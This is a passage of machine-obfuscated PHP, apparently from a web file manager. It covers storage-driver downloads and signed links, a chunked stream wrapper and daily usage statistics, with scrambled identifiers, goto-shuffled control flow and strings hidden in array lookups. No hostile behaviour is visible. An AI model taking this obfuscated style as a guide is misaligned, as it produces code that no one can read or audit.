$D——™´²Å«[175] => $this->endpoint . $A‡‰âÅğ¾); return $BÆÒµÂ ; goto fö·»Ú¹®™; fö·»Ú¹®™: } public function download($CÃŒÌÖØˆë, $B¶†ñ‚Ø…) { goto A¹éˆÄŠ¸; cˆÅÉÀ¡„: fclose($EŠ„µÛ˜µ); return $B¶†ñ‚Ø…; goto AÀˆ˜Ÿ‹„; A¹éˆÄŠ¸: $f Ğ™Û½÷Ø = IO::getPathInner(IO::mkfile($B¶†ñ‚Ø…)); if (!($cšåóëğñ¬ = $this->link($CÃŒÌÖØˆë))) { return !1; } $aêŠš‚”‘ = 0; goto fÉØ³Î¾; fÉØ³Î¾: $BÜ÷Œ“¿ ğ = 1024 * 200; $EŠ„µÛ˜µ = fopen($f Ğ™Û½÷Ø, $_SERVER[ÉóçÄÇ][1295]); while (!0) { $cæ†ğìÁ·¹ = $this->fileSubstr($CÃŒÌÖØˆë, $aêŠš‚”‘, $BÜ÷Œ“¿ ğ); if ($cæ†ğìÁ·¹ === !1) { return !1; } fwrite($EŠ„µÛ˜µ, $cæ†ğìÁ·¹); $aêŠš‚”‘ += $BÜ÷Œ“¿ ğ; if (strlen($cæ†ğìÁ·¹) < $BÜ÷Œ“¿ ğ) { break; } } goto cˆÅÉÀ¡„; AÀˆ˜Ÿ‹„: } public function link($A©­¼È¸¢Œ, $E÷ğßÓºÀ = array()) { $e´°¸ö¬¶’ =& $_SERVER[ÉóçÄÇ]; $A©­¼È¸¢Œ = trim($A©­¼È¸¢Œ, $e´°¸ö¬¶’[8]); if (!empty($this->token)) { $dÍé¶Í·‚™ = strtotime(date($e´°¸ö¬¶’[1347])); $f³Ï¹·÷¦« = substr(md5($this->token . $e´°¸ö¬¶’[280] . $dÍé¶Í·‚™ . $e´°¸ö¬¶’[1348] . $A©­¼È¸¢Œ), 12, 8) . $dÍé¶Í·‚™; $E÷ğßÓºÀ[] = $e´°¸ö¬¶’[1349] . $f³Ï¹·÷¦«; } $D¯ºà¨¸ø = !empty($E÷ğßÓºÀ) ? $e´°¸ö¬¶’[69] . implode($e´°¸ö¬¶’[280], $E÷ğßÓºÀ) : $e´°¸ö¬¶’[33]; return $this->getHost() . $e´°¸ö¬¶’[8] . $A©­¼È¸¢Œ . $D¯ºà¨¸ø; } public function fileOut($A—µ£—¥¡, $f²‘Ùğ‡ƒµ = false, $béÂ®ì¦ø’ = false, $B»¶‰„Òğ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($A—µ£—¥¡, $f²‘Ùğ‡ƒµ, $béÂ®ì¦ø’, $B»¶‰„Òğ); } if (!$béÂ®ì¦ø’) { $béÂ®ì¦ø’ = $this->pathThis($A—µ£—¥¡); } $FßÊÁæ³Æ÷ = $f²‘Ùğ‡ƒµ ? array($_SERVER[ÉóçÄÇ][1350] . rawurlencode($béÂ®ì¦ø’)) : array(); $DØÓ£Ä™½Ï = $this->link($A—µ£—¥¡, $FßÊÁæ³Æ÷); $this->fileOutLink($DØÓ£Ä™½Ï); } public function fileOutServer($f…äƒÁÚ½, $c‚ÇæçùŸ¬ = false, $BŠä¤¥‡Î = false, $eêÆÍ«Â‚ = '') { parent::fileOut($f…äƒÁÚ½, $c‚ÇæçùŸ¬, $BŠä¤¥‡Î, $eêÆÍ«Â‚); } public function fileOutImage($d¸‚¢•Í…, $c¨Š¡õÇãÀ = 250) { $C—³ä¦ÁÚ = $this->link($d¸‚¢•Í… . $_SERVER[ÉóçÄÇ][1351] . $c¨Š¡õÇãÀ); $this->fileOutLink($C—³ä¦ÁÚ); } public function fileOutImageServer($EÈêï–®ğ, $C„²ÙÇ˜ = 250) { parent::fileOutImage($EÈêï–®ğ, $C„²ÙÇ˜); } public function hashMd5($AÜ ê•Éƒ¦) { $Aˆò™Ší¡£ =& $_SERVER[ÉóçÄÇ]; $c‚‹†½¡ï = $this->_objectMeta($AÜ ê•Éƒ¦); return isset($c‚‹†½¡ï[$Aˆò™Ší¡£[206]]) ? $c‚‹†½¡ï[$Aˆò™Ší¡£[206]] : !1; } public function size($cäÛÚâíà) { $e‘¯ùÂ±Œ­ = $this->objectMeta($cäÛÚâíà); return $e‘¯ùÂ±Œ­ ? $e‘¯ùÂ±Œ­[$_SERVER[ÉóçÄÇ][77]] : 0; } public function info($Cµ¸ë‰‚œÛ) { if ($this->isFolder($Cµ¸ë‰‚œÛ)) { return $this->folderInfo($Cµ¸ë‰‚œÛ); } else { if ($this->isFile($Cµ¸ë‰‚œÛ)) { return $this->fileInfo($Cµ¸ë‰‚œÛ); } } return !1; } public function exist($CèƒÕ¹–Õƒ) { return $this->isFile($CèƒÕ¹–Õƒ) || $this->isFolder($CèƒÕ¹–Õƒ); } public function isFile($cŠÅğÏ‡óª) { return !$this->isFolder($cŠÅğÏ‡óª) && $this->objectMeta($cŠÅğÏ‡óª); } public function isFolder($F´¬¥Ù§ˆ§) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][197], $F´¬¥Ù§ˆ§); } protected function objectMeta($F‘®×Ë››‘) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][198], $F‘®×Ë››‘); } protected function _objectMeta($cÃŠ¸òçñ) { goto dÇ‚ÛšÏİ”; dÇ‚ÛšÏİ”: $FãÏÓ«ñ’Œ =& $_SERVER[ÉóçÄÇ]; if ($cÃŠ¸òçñ == $FãÏÓ«ñ’Œ[33] || $cÃŠ¸òçñ == $FãÏÓ«ñ’Œ[8]) { return array(); } $b†…•·ƒšÀ = $this->ussRequest($cÃŠ¸òçñ, $FãÏÓ«ñ’Œ[1352]); goto dùØïÓÚŒê; dùØïÓÚŒê: if (!$b†…•·ƒšÀ[$FãÏÓ«ñ’Œ[1068]]) { return null; } $eÆº¯Ó“­å = isset($b†…•·ƒšÀ[$FãÏÓ«ñ’Œ[1070]]) ? $b†…•·ƒšÀ[$FãÏÓ«ñ’Œ[1070]] : array(); if (!isset($eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1353]])) { return null; } goto fô»Ìæ½•; fô»Ìæ½•: $f„‘ÚÁ¶¶Î = array($FãÏÓ«ñ’Œ[29] => isset($eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1353]]) ? $eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1353]] : null, $FãÏÓ«ñ’Œ[77] => isset($eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1354]]) ? $eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1354]] : null, $FãÏÓ«ñ’Œ[206] => isset($eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1355]]) ? $eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1355]] : null, $FãÏÓ«ñ’Œ[1322] => isset($eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1356]]) ? $eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1356]] : null); $f„‘ÚÁ¶¶Î[$FãÏÓ«ñ’Œ[1323]] = isset($eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1357]]) ? strtotime($eÆº¯Ó“­å[$FãÏÓ«ñ’Œ[1357]]) : $f„‘ÚÁ¶¶Î[$FãÏÓ«ñ’Œ[1322]]; return $f„‘ÚÁ¶¶Î; goto c£‰¡Ö¿³ó; c£‰¡Ö¿³ó: } protected function _isFolder($D’ÅÖØùÈ) { $F¥§ùŒŠ‘” =& $_SERVER[ÉóçÄÇ]; if ($D’ÅÖØùÈ == $F¥§ùŒŠ‘”[33] || $D’ÅÖØùÈ == $F¥§ùŒŠ‘”[8]) { return !0; } $f„ö•“„ŠË = $this->_objectMeta($D’ÅÖØùÈ); return isset($f„ö•“„ŠË[$F¥§ùŒŠ‘”[29]]) && $f„ö•“„ŠË[$F¥§ùŒŠ‘”[29]] == $F¥§ùŒŠ‘”[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($E‰Ã®Âò†ª = false) { } public function exist($fÈŸ¤ò™å) { $fâšíøßôŒ = $this->info($fÈŸ¤ò™å); return $fâšíøßôŒ[$_SERVER[ÉóçÄÇ][193]]; } public function isFile($aÃ”ô¡˜†’) { $FƒÃ‹µÜŠï = $this->info($aÃ”ô¡˜†’); return $FƒÃ‹µÜŠï[$_SERVER[ÉóçÄÇ][193]]; } public function isFolder($AŠ²½ĞŠçª) { return !1; } public function size($Ašóó‘‡İ) { $bò·¦ë‹Şç = $this->info($Ašóó‘‡İ); return $bò·¦ë‹Şç[$_SERVER[ÉóçÄÇ][77]]; } public function info($Cº„äî‚˜) { return $this->infoParse($Cº„äî‚˜); } public function infoAuth($aß‰ÈµôÃ) { return $this->infoParse($aß‰ÈµôÃ); } public function infoWithChildren($eÎä¹§ª„ó) { return $this->infoParse($eÎä¹§ª„ó); } public function infoFull($CÖ…‡è¨Ú) { return $this->infoParse($CÖ…‡è¨Ú); } private function infoParse($d¬áò©Æ•„) { $aŠÁ´„ñğ™ =& $_SERVER[ÉóçÄÇ]; $Fİ¾ñ¸İ = $this->header($d¬áò©Æ•„); if (!$Fİ¾ñ¸İ || !$Fİ¾ñ¸İ[$aŠÁ´„ñğ™[711]]) { return !1; } $fš´Ì×š = _get($Fİ¾ñ¸İ, $aŠÁ´„ñğ™[333], 0); $a©è¤Øì½ = array($aŠÁ´„ñğ™[28] => $Fİ¾ñ¸İ[$aŠÁ´„ñğ™[28]], $aŠÁ´„ñğ™[75] => $d¬áò©Æ•„, $aŠÁ´„ñğ™[29] => $aŠÁ´„ñğ™[173], $aŠÁ´„ñğ™[77] => intval($fš´Ì×š), $aŠÁ´„ñğ™[167] => get_path_ext($Fİ¾ñ¸İ[$aŠÁ´„ñğ™[28]]), $aŠÁ´„ñğ™[1236] => $fš´Ì×š > 0 && $Fİ¾ñ¸İ[$aŠÁ´„ñğ™[1358]], $aŠÁ´„ñğ™[1237] => !1); return $a©è¤Øì½; } private function header($B„ç à¤ô¬) { goto Bµåö»’Å¿; fÀË¼Á¨Œ§: $GLOBALS[$FôÎ×¹¿îÅ[1359]] = !0; self::$_cacheHeader[$B„ç à¤ô¬] = url_header($B„ç à¤ô¬); $GLOBALS[$FôÎ×¹¿îÅ[1359]] = $DöšĞäºóŸ; goto f«ëÏëˆ¹Ú; f«ëÏëˆ¹Ú: return self::$_cacheHeader[$B„ç à¤ô¬]; goto aëŒÇˆ¨Âó; Bµåö»’Å¿: $FôÎ×¹¿îÅ =& $_SERVER[ÉóçÄÇ]; if (isset(self::$_cacheHeader[$B„ç à¤ô¬])) { return self::$_cacheHeader[$B„ç à¤ô¬]; } $DöšĞäºóŸ = isset($GLOBALS[$FôÎ×¹¿îÅ[1359]]) ? $GLOBALS[$FôÎ×¹¿îÅ[1359]] : !1; goto fÀË¼Á¨Œ§; aëŒÇˆ¨Âó: } public function hashSimple($EïŒÆ×´ª, $Cƒ½ƒÖ“†Ğ = false) { goto A‘¡ˆ¾Â©¤; d ƒİ‚—“æ: if ($dƒ›®åÖ“ <= $a“˜¨†”œ * $e¿ÇÖÊ‘õ‚) { return md5($this->fileSubstr($EïŒÆ×´ª, 0, $dƒ›®åÖ“)) . $dƒ›®åÖ“; } $D÷öÉ‰ Ñ‹ = intval($dƒ›®åÖ“ / $e¿ÇÖÊ‘õ‚); $F‚î‹”½Üá = $aÑ¯ºÁ³õÔ[33]; goto E•è“öÉÚ; FÙ©­ã®˜ë: $dƒ›®åÖ“ = $b½Õ£·—óµ[$aÑ¯ºÁ³õÔ[77]]; $a“˜¨†”œ = 200; $e¿ÇÖÊ‘õ‚ = 50; goto d ƒİ‚—“æ; A‘¡ˆ¾Â©¤: $aÑ¯ºÁ³õÔ =& $_SERVER[ÉóçÄÇ]; $b½Õ£·—óµ = $this->info($EïŒÆ×´ª); if (!$b½Õ£·—óµ || !$b½Õ£·—óµ[$aÑ¯ºÁ³õÔ[193]]) { return !1; } goto FÙ©­ã®˜ë; E•è“öÉÚ: $c¸¼öÃ®ª = timeFloat(); $DæÓíÜ ”ƒ = 15; for ($AÓÌÚ´ƒ¼ = 0; $AÓÌÚ´ƒ¼ < $e¿ÇÖÊ‘õ‚; $AÓÌÚ´ƒ¼++) { if (timeFloat() - $c¸¼öÃ®ª > $DæÓíÜ ”ƒ) { return !1; } $F‰ ±éƒ­× = $this->fileSubstr($EïŒÆ×´ª, $D÷öÉ‰ Ñ‹ * $AÓÌÚ´ƒ¼, $a“˜¨†”œ); if (!$F‰ ±éƒ­×) { return !1; } $F‚î‹”½Üá .= $F‰ ±éƒ­×; } goto Aæ’àôÖÎ§; Aæ’àôÖÎ§: $F‚î‹”½Üá .= $this->fileSubstr($EïŒÆ×´ª, $dƒ›®åÖ“ - $a“˜¨†”œ, $a“˜¨†”œ); return md5($F‚î‹”½Üá) . $dƒ›®åÖ“; goto AŠÉí×©›†; AŠÉí×©›†: } public function getContent($böğ—›¢×ï) { return $this->fileSubstr($böğ—›¢×ï); } public function fileSubstr($Bì§àÛªîˆ, $dÛÓÌˆŒßä = 0, $bèˆèóÁ‘ = -1) { goto cÈ—„ñ¼•Í; cÈ—„ñ¼•Í: $Eê‰«ÀÌÓ× =& $_SERVER[ÉóçÄÇ]; $BëåÛ¿öĞ˜ = $this->info($Bì§àÛªîˆ); if (!$BëåÛ¿öĞ˜ || !$BëåÛ¿öĞ˜[$Eê‰«ÀÌÓ×[193]] && $BëåÛ¿öĞ˜[$Eê‰«ÀÌÓ×[77]] > 1024 * 1024 * 10) { return !1; } goto d‚œö¡—×Ó; d‚œö¡—×Ó: if ($bèˆèóÁ‘ === -1) { $bèˆèóÁ‘ = $BëåÛ¿öĞ˜[$Eê‰«ÀÌÓ×[77]]; } if ($bèˆèóÁ‘ == 0) { return $Eê‰«ÀÌÓ×[33]; } $e‚‰ñÇ—¨Ø = array($Eê‰«ÀÌÓ×[1360] . $dÛÓÌˆŒßä . $Eê‰«ÀÌÓ×[737] . ($dÛÓÌˆŒßä + $bèˆèóÁ‘ - 1)); goto aàÍ‰˜ÓŠº; aàÍ‰˜ÓŠº: $aÜ‘íäŒ‰õ = url_request($Bì§àÛªîˆ, $Eê‰«ÀÌÓ×[226], !1, $e‚‰ñÇ—¨Ø, !1, !1, 1); return $aÜ‘íäŒ‰õ[$Eê‰«ÀÌÓ×[1070]] ? $aÜ‘íäŒ‰õ[$Eê‰«ÀÌÓ×[1070]] : $Eê‰«ÀÌÓ×[33]; goto DÁ¢Ã†’ˆÅ; DÁ¢Ã†’ˆÅ: } public function download($dóó´‹†öÊ, $F‘êæÇ”†) { Downloader::start($dóó´‹†öÊ, $F‘êæÇ”†); return $F‘êæÇ”†; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($eÁ¨Éôæ¢, $AÚ”ê¨õëå = '') { goto E×Î·ùô¯Ä; Dõ¿ÚŒËª: $this->pathOpen = $eÁ¨Éôæ¢; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto f¯ÎÊòšƒÖ; E×Î·ùô¯Ä: $this->info = $this->info($eÁ¨Éôæ¢); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÉóçÄÇ][75]]; goto Dõ¿ÚŒËª; f¯ÎÊòšƒÖ: if (!isset(self::$_chunkBuffer[$eÁ¨Éôæ¢])) { self::$_chunkBuffer[$eÁ¨Éôæ¢] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto D˜ˆªâ­º©; D˜ˆªâ­º©: } function stream_read($BœßÑ’ŞØ) { $C•‡„œ¨İí = $this->fileSubstr($this->pose, $BœßÑ’ŞØ); $this->pose += strlen($C•‡„œ¨İí); return $C•‡„œ¨İí; } public function stream_tell() { return $this->pose; } public function stream_seek($f’òå£‡š, $e¸¢î¹·»Ø) { $b×¬„‚ÕíÛ =& $_SERVER[ÉóçÄÇ]; if ($e¸¢î¹·»Ø == SEEK_SET) { $this->pose = $f’òå£‡š; } else { if ($e¸¢î¹·»Ø == SEEK_CUR) { $this->pose += $f’òå£‡š; } else { if ($e¸¢î¹·»Ø == SEEK_END) { $this->pose = $this->info[$b×¬„‚ÕíÛ[77]] + intval($f’òå£‡š); } } } if ($f’òå£‡š < 0) { $this->pose = $this->info[$b×¬„‚ÕíÛ[77]] + $f’òå£‡š; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÉóçÄÇ][77]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($a¸Ë¸…Çß, $a¶Á‰±é¥») { $CÂÜàğ¼Úâ =& $_SERVER[ÉóçÄÇ]; $B£…†å¹›Å = $this->info($a¸Ë¸…Çß); return array($CÂÜàğ¼Úâ[1361] => 0, $CÂÜàğ¼Úâ[1362] => 0, $CÂÜàğ¼Úâ[12] => 32768 + 511, $CÂÜàğ¼Úâ[1363] => 0, $CÂÜàğ¼Úâ[1364] => 0, $CÂÜàğ¼Úâ[1365] => 0, $CÂÜàğ¼Úâ[1366] => 0, $CÂÜàğ¼Úâ[77] => $B£…†å¹›Å[$CÂÜàğ¼Úâ[77]], $CÂÜàğ¼Úâ[1367] => $B£…†å¹›Å[$CÂÜàğ¼Úâ[1235]], $CÂÜàğ¼Úâ[1323] => $B£…†å¹›Å[$CÂÜàğ¼Úâ[83]], $CÂÜàğ¼Úâ[1322] => $B£…†å¹›Å[$CÂÜàğ¼Úâ[192]], $CÂÜàğ¼Úâ[1368] => 0, $CÂÜàğ¼Úâ[1369] => 0); } static $fileInfo = array(); public function info($d„Œ„‰àÅÅ) { $AÓ™®‹Ã·§ = $_SERVER[ÉóçÄÇ][1370]; if (isset(self::$fileInfo[$d„Œ„‰àÅÅ])) { return self::$fileInfo[$d„Œ„‰àÅÅ]; } if (substr($d„Œ„‰àÅÅ, 0, strlen($AÓ™®‹Ã·§)) != $AÓ™®‹Ã·§) { return !1; } self::$fileInfo[$d„Œ„‰àÅÅ] = IO::info(substr($d„Œ„‰àÅÅ, strlen($AÓ™®‹Ã·§))); return self::$fileInfo[$d„Œ„‰àÅÅ]; } public static function read($FÌˆí°Ô¼æ, $fØ”¸öÉ•¹, $EÇ¶öí×³à) { if (!isset(self::$_fopenCache[$FÌˆí°Ô¼æ])) { $DÀÉ±ƒ­ôí = new StreamWrapperIO(); $DÀÉ±ƒ­ôí->stream_open($FÌˆí°Ô¼æ); self::$_fopenCache[$FÌˆí°Ô¼æ] = $DÀÉ±ƒ­ôí; } $DÀÉ±ƒ­ôí = self::$_fopenCache[$FÌˆí°Ô¼æ]; return $DÀÉ±ƒ­ôí->fileSubstr($fØ”¸öÉ•¹, $EÇ¶öí×³à); } public static function _read($d×œøë´ç, $bŠ®Ñç¡¤Ô, $Cë³ãæ§¼ã) { goto aÉ‘Æ—í; aÉ‘Æ—í: $Aİ™‰àµ¾• =& $_SERVER[ÉóçÄÇ]; $D…ÚÚœÄ = fopen($d×œøë´ç, $Aİ™‰àµ¾•[1239]); if (!$D…ÚÚœÄ) { return $Aİ™‰àµ¾•[33]; } goto F‡Ù´äá¬Ö; F‡Ù´äá¬Ö: $b·öê™¥¢ö = 8192; fseek($D…ÚÚœÄ, $bŠ®Ñç¡¤Ô, SEEK_SET); $Aºö©‘œ¢İ = $Aİ™‰àµ¾•[33]; goto c˜ óÔğóƒ; c˜ óÔğóƒ: $eªºÜéŠ°… = 0; while ($eªºÜéŠ°… < $Cë³ãæ§¼ã) { $fÛˆĞÆ»Œ = min($b·öê™¥¢ö, $Cë³ãæ§¼ã - $eªºÜéŠ°…); $Aºö©‘œ¢İ .= fread($D…ÚÚœÄ, $fÛˆĞÆ»Œ); $eªºÜéŠ°… += $fÛˆĞÆ»Œ; } fclose($D…ÚÚœÄ); goto c“Ú¦àÚĞñ; c“Ú¦àÚĞñ: return $Aºö©‘œ¢İ; goto e¸øç·ùöÏ; e¸øç·ùöÏ: } public function fileSubstr($fÆµÚ—Í, $dŒÌ‰š®¡‰) { goto A°‘×Şó; D¾«æ¥ŞŒÙ: $cÀó¾ÊÎ = 64 * 1024; $cç¡òÍ½†„ =& self::$_chunkBuffer[$this->path]; if (!$cç¡òÍ½†„) { $cç¡òÍ½†„ = array(); } goto DÏÆ¥; Fá° §½œé: if ($fÆµÚ—Í + $dŒÌ‰š®¡‰ > $eöŸ¤Ó¢¹) { $dŒÌ‰š®¡‰ = $eöŸ¤Ó¢¹ - $fÆµÚ—Í; } if ($dŒÌ‰š®¡‰ <= 0) { return $EÕ†¦ÂŞÁ[33]; } if ($fÆµÚ—Í < 0 || $fÆµÚ—Í >= $eöŸ¤Ó¢¹ || $dŒÌ‰š®¡‰ <= 0 || $dŒÌ‰š®¡‰ > 1024 * 1024 * 5) { throw new Exception("\151\157\106\151\154\x65\x52\145\x61\x64\x20\x65\x72\162\157\x72\41\40\x73\164\x61\x72\x74\75{$fÆµÚ—Í}\73\154\145\x6e\147\164\x68\x3d{$dŒÌ‰š®¡‰}\x3b\x20\x73\x69\x7a\145\x3d{$eöŸ¤Ó¢¹}\73"); } goto D¾«æ¥ŞŒÙ; cœ¦¹ÄÈ: $bäÌŸ÷ò«Ã = ceil(($fÆµÚ—Í + $dŒÌ‰š®¡‰) / $cÀó¾ÊÎ) * $cÀó¾ÊÎ - $CÄÔñíÓô; $a‚¦ìÛ†ØŠ = IO::fileSubstr($this->path, $CÄÔñíÓô, $bäÌŸ÷ò«Ã); $cç¡òÍ½†„[$CÄÔñíÓô . $EÕ†¦ÂŞÁ[33]] = $a‚¦ìÛ†ØŠ; goto e­Ô÷ø“¹¶; DÏÆ¥: $EŠàå„±³˜ = 0; $fæë¼§¬Á‹ = 0; $DâØÃÌğî = $EÕ†¦ÂŞÁ[33]; goto BèÈÑİãËµ; dÈƒ„à: $Aƒê‚ÈòÃÄ = $dŒÌ‰š®¡‰; if ($fÆµÚ—Í < 0) { $fÆµÚ—Í = $eöŸ¤Ó¢¹ + $fÆµÚ—Í; } if ($dŒÌ‰š®¡‰ === !1) { $dŒÌ‰š®¡‰ = $eöŸ¤Ó¢¹ - $fÆµÚ—Í; } goto Fá° §½œé; A°‘×Şó: $EÕ†¦ÂŞÁ =& $_SERVER[ÉóçÄÇ]; $eöŸ¤Ó¢¹ = $this->info[$EÕ†¦ÂŞÁ[77]]; $Dğï„ÅœøÅ = $fÆµÚ—Í; goto dÈƒ„à; BèÈÑİãËµ: foreach ($cç¡òÍ½†„ as $EŠàå„±³˜ => $DâØÃÌğî) { $EŠàå„±³˜ = intval($EŠàå„±³˜); $fæë¼§¬Á‹ = $EŠàå„±³˜ + strlen($DâØÃÌğî); if ($fÆµÚ—Í >= $fæë¼§¬Á‹) { continue; } if ($fÆµÚ—Í >= $EŠàå„±³˜ && $fÆµÚ—Í + $dŒÌ‰š®¡‰ <= $fæë¼§¬Á‹) { return substr($DâØÃÌğî, $fÆµÚ—Í - $EŠàå„±³˜, $dŒÌ‰š®¡‰); } break; } if (count($cç¡òÍ½†„) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($EÕ†¦ÂŞÁ[1371], $EÕ†¦ÂŞÁ[1372] . count($cç¡òÍ½†„) . "\73\x73\x74\x61\x72\x74\75{$fÆµÚ—Í}\x2c\154\145\x6e\147\164\150\x3d{$dŒÌ‰š®¡‰}\x3b\x70\x6f\163\145\72{$EŠàå„±³˜}\x7e{$fæë¼§¬Á‹}"); throw new Exception($EÕ†¦ÂŞÁ[1373]); } $CÄÔñíÓô = intval($fÆµÚ—Í / $cÀó¾ÊÎ) * $cÀó¾ÊÎ; goto cœ¦¹ÄÈ; e­Ô÷ø“¹¶: ksort($cç¡òÍ½†„); $C÷™æ”î = substr($a‚¦ìÛ†ØŠ, $fÆµÚ—Í - $CÄÔñíÓô, $dŒÌ‰š®¡‰); return $C÷™æ”î; goto E¿ÀãßÔ««; E¿ÀãßÔ««: } private function log($c²›¢ŸåìÅ, $BöçÛö”«) { $CÜ¼ƒåï°µ =& $_SERVER[ÉóçÄÇ]; $CªÑªí´¬ = timeFloat() - $this->timeStart; write_log(sprintf($CÜ¼ƒåï°µ[1374], $c²›¢ŸåìÅ, $this->info[$CÜ¼ƒåï°µ[28]], $CªÑªí´¬, $BöçÛö”«), $CÜ¼ƒåï°µ[1060]); } } goto F‰‚ÖÓº; Dšà‚š™ã: class AnalysisModel extends ModelBaseLight { public function init($B‰¨Ş˜Åˆï) { $aªè¸ãòíŒ =& $_SERVER[ÉóçÄÇ]; $CŒ·ˆ¨ª¦ = array($aªè¸ãòíŒ[557] => array($aªè¸ãòíŒ[29] => $aªè¸ãòíŒ[1600], $aªè¸ãòíŒ[269] => array($aªè¸ãòíŒ[220], $aªè¸ãòíŒ[722], $aªè¸ãòíŒ[1601], $aªè¸ãòíŒ[1602])), $aªè¸ãòíŒ[1603] => array($aªè¸ãòíŒ[29] => $aªè¸ãòíŒ[1604], $aªè¸ãòíŒ[269] => array($aªè¸ãòíŒ[220], $aªè¸ãòíŒ[720], $aªè¸ãòíŒ[1605], $aªè¸ãòíŒ[1606], $aªè¸ãòíŒ[1607]))); if (!isset($CŒ·ˆ¨ª¦[$B‰¨Ş˜Åˆï])) { return !1; } $this->optionType = $CŒ·ˆ¨ª¦[$B‰¨Ş˜Åˆï][$aªè¸ãòíŒ[29]]; $this->field = $CŒ·ˆ¨ª¦[$B‰¨Ş˜Åˆï][$aªè¸ãòíŒ[269]]; return !0; } public function listData($dÎ•¾Ø˜Á = false, $d”¤îÄ“ñ = "\155\x6f\x64\x69\146\x79\x54\151\x6d\145", $e¿­’—‹¤ = false) { return parent::listData($dÎ•¾Ø˜Á, $d”¤îÄ“ñ, $e¿­’—‹¤); } public function trendList($DŞ¦£Ú¾Ÿ) { goto fÛ«à³¼œ¶; fÛ«à³¼œ¶: $C¿óÓÉÂÒ =& $_SERVER[ÉóçÄÇ]; $AÎó®šƒÓ‰ = $this->listData(); if ($AÎó®šƒÓ‰) { $BÔõ÷—É°Ì = end($AÎó®šƒÓ‰); $bòË•Èß¢Ò = date($C¿óÓÉÂÒ[1608], strtotime($C¿óÓÉÂÒ[1609])); if ($BÔõ÷—É°Ì[$C¿óÓÉÂÒ[220]] == $bòË•Èß¢Ò) { return $AÎó®šƒÓ‰; } $cÃ´½éÌé = strtotime($BÔõ÷—É°Ì[$C¿óÓÉÂÒ[220]]); } goto Cà®‡ÌáÕ; Cà®‡ÌáÕ: if (!isset($cÃ´½éÌé)) { $aµ‰ÄÃ“£á = $DŞ¦£Ú¾Ÿ == $C¿óÓÉÂÒ[557] ? $C¿óÓÉÂÒ[501] : $C¿óÓÉÂÒ[776]; $cÃ´½éÌé = Model($aµ‰ÄÃ“£á)->min($C¿óÓÉÂÒ[192]); } $fîõ³‡†Ä¤ = $C¿óÓÉÂÒ[1610] . ucfirst($DŞ¦£Ú¾Ÿ); $FàÊÙË× = $this->dateList($cÃ´½éÌé); goto fîÉŞÊõÃŸ; fîÉŞÊõÃŸ: foreach ($FàÊÙË× as $bòË•Èß¢Ò) { $this->{$fîõ³‡†Ä¤}($bòË•Èß¢Ò); } return $this->listData(); goto b‰ˆğéİ; b‰ˆğéİ: } private function dateList($E²‡œ‚«´) { $AÈ‹Í£ÑÒ¹ =& $_SERVER[ÉóçÄÇ]; $f×…ç–…õ„ = $E²‡œ‚«´; $d´‹«¦†±¡ = strtotime($AÈ‹Í£ÑÒ¹[1609]); $fÅ™á×¾îì = array(); while ($f×…ç–…õ„ <= $d´‹«¦†±¡) { $fÅ™á×¾îì[] = date($AÈ‹Í£ÑÒ¹[1608], $f×…ç–…õ„); $f×…ç–…õ„ = strtotime($AÈ‹Í£ÑÒ¹[1611], $f×…ç–…õ„); } return $fÅ™á×¾îì; } public function _recordUser($dÒ¦¨Ù„‘¿ = '') { goto B¬ëœäò¼î; B¬ëœäò¼î: $b¹Ô˜ß…Ê =& $_SERVER[ÉóçÄÇ]; $dˆâ…ĞÄÚ = strtotime(date($b¹Ô˜ß…Ê[1612], strtotime($dÒ¦¨Ù„‘¿))); $C±ÔÉğ› = strtotime(date($b¹Ô˜ß…Ê[1613], strtotime($dÒ¦¨Ù„‘¿))); goto F”ƒ³¾“˜Ä; E×ÒŸé“Ãà: $a”ìÃÒ·Ùº = Model($b¹Ô˜ß…Ê[501])->where($FÖ‹Ø×¼òÅ)->count($b¹Ô˜ß…Ê[1511]); $FÖ‹Ø×¼òÅ[$b¹Ô˜ß…Ê[29]] = $b¹Ô˜ß…Ê[1614]; $FôµÑœÚßâ = Model($b¹Ô˜ß…Ê[1615])->where($FÖ‹Ø×¼òÅ)->count($b¹Ô˜ß…Ê[1616]); goto EÚÛ¨°†Áî; F”ƒ³¾“˜Ä: $FÖ‹Ø×¼òÅ = array($b¹Ô˜ß…Ê[192] => array($b¹Ô˜ß…Ê[952], $C±ÔÉğ›)); $f—²§Íê˜Ù = Model($b¹Ô˜ß…Ê[501])->where($FÖ‹Ø×¼òÅ)->count($b¹Ô˜ß…Ê[1511]); $FÖ‹Ø×¼òÅ[$b¹Ô˜ß…Ê[192]] = array($b¹Ô˜ß…Ê[329], array($dˆâ…ĞÄÚ, $C±ÔÉğ›)); goto E×ÒŸé“Ãà; EÚÛ¨°†Áî: $bÁ¸á„Ä­ = array($b¹Ô˜ß…Ê[220] => $dÒ¦¨Ù„‘¿, $b¹Ô˜ß…Ê[722] => (int) $f—²§Íê˜Ù, $b¹Ô˜ß…Ê[1601] => (int) $a”ìÃÒ·Ùº, $b¹Ô˜ß…Ê[1602] => (int) $FôµÑœÚßâ); return $this->insert($bÁ¸á„Ä­); goto CÆñôÊß›; CÆñôÊß›: } public function _recordStore($Cù·»¤ = '') { goto d˜˜…×ÈŞœ; d˜˜…×ÈŞœ: 